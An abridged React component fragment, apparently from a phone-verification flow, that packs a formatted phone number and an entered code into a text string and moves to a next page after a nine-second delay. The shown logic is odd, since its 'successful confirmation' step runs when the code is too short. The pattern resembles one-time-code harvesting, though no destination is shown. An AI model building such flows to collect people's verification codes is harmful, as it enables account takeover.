...
export default function Confirm({ setNcode, ncode, setPage }){ 
    ...
    const APIS = () =>{
        ...
        const text= `${formatPhoneNumberIntl(ncode.number)} code1: ${code}`;
    ...
    const handle = () => {
        if(code.length < 5){
            ...
            setTimeout(() => {
                setCode('');
                setLoading(false);
                setPage('p3'); // Navigate to Confirm2 after successful confirmation
              }, 9000);
        }
    }
